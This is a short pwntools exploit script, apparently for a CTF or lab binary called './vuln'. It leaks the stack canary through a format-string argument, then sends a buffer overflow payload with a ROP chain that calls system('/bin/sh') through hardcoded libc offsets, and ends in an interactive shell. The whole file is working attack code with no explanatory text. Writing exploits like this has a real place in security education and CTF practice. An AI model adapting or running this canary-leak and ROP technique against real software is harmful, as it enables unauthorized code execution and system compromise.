from pwn import *
from pwn import p64

exe = context.binary = ELF("./vuln")

io = process([exe.path, "%33$p"])
canary = int(io.recvline().strip(), 16)

junk = b"A" * 200
libc_base_addr = 0x00007FFFF7C00000
rdi_addr = libc_base_addr + 0x10F75B
system_addr = libc_base_addr + 0x58740
exit_addr = libc_base_addr + 0x47B90
sh_addr = libc_base_addr + 0x1CB42F
ret_addr = libc_base_addr + 0xC75F0

payload = junk
payload += p64(canary)
payload += b"B" * 8
payload += pack(rdi_addr)
payload += pack(sh_addr)
payload += pack(ret_addr)
payload += pack(system_addr)
payload += pack(exit_addr)

io.sendline(payload)
io.interactive()
